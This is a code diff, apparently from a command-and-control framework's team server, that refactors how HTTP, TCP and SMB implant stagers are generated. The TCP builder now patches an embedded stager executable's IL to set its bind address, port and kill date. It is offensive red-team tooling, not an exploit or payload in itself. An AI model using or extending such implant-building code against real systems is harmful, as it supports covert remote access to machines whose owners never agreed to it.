@@ -18,22 +18,22 @@ namespace TeamServer.Models
             this.Listener = Listener;
         }
 
-        public byte[] GenerateStager(StagerRequest Request)
+        public byte[] GenerateStager()
         {
             byte[] finalStager = null;
 
             switch (Listener.Type)
             {
                 case Listener.ListenerType.HTTP:
-                    finalStager = GenerateHTTPStager(Request);
+                    finalStager = GenerateHTTPStager();
                     break;
 
                 case Listener.ListenerType.TCP:
-                    finalStager = GenerateTCPStager(Request);
+                    finalStager = GenerateTCPStager();
                     break;
 
                 case Listener.ListenerType.SMB:
-                    finalStager = GenerateSMBStager(Request);
+                    finalStager = GenerateSMBStager();
                     break;
 
                 default:
@@ -43,7 +43,7 @@ namespace TeamServer.Models
             return finalStager;
         }
 
-        byte[] GenerateHTTPStager(StagerRequest Request)
+        byte[] GenerateHTTPStager()
         {
             var listener = Listener as ListenerHTTP;
 
@@ -168,17 +168,28 @@ namespace TeamServer.Models
             return WriteModule(md);
         }
 
-        byte[] GenerateTCPStager(StagerRequest Request)
+        byte[] GenerateTCPStager()
         {
-            var stager = Helpers.GetEmbeddedResource("stager_tcp.exe");
-            var md = ModuleDefMD.Load(stager);
+            var listener = Listener as ListenerTCP;
 
-            var stagerType = md.Types.FirstOrDefault(t => t.FullName.Equals("Stager.Stager", StringComparison.OrdinalIgnoreCase));
+            var raw = Helpers.GetEmbeddedResource("stager_tcp.exe");
+            var md = ModuleDefMD.Load(raw);
+
+            var stager = md.Types.FirstOrDefault(t => t.FullName.Equals("Stager.Stager", StringComparison.OrdinalIgnoreCase));
+
+            var bindAddress = stager.Methods.FirstOrDefault(m => m.FullName.Equals("System.String Stager.Stager::get_BindAddress()", StringComparison.OrdinalIgnoreCase));
+            bindAddress.Body.Instructions[1].Operand = listener.BindAddress;
+
+            var bindPort = stager.Methods.FirstOrDefault(m => m.FullName.Equals("System.Int32 Stager.Stager::get_BindPort()", StringComparison.OrdinalIgnoreCase));
+            bindPort.Body.Instructions[1].Operand = listener.BindPort;
+
+            var killDate = stager.Methods.FirstOrDefault(m => m.FullName.Equals("System.DateTime Stager.Stager::get_KillDate()", StringComparison.OrdinalIgnoreCase));
+            killDate.Body.Instructions[1].Operand = listener.KillDate.ToString();
 
             return WriteModule(md);
         }
 
-        byte[] GenerateSMBStager(StagerRequest Request)
+        byte[] GenerateSMBStager()
         {
             var stager = Helpers.GetEmbeddedResource("stager_smb.exe");
             var md = ModuleDefMD.Load(stager);
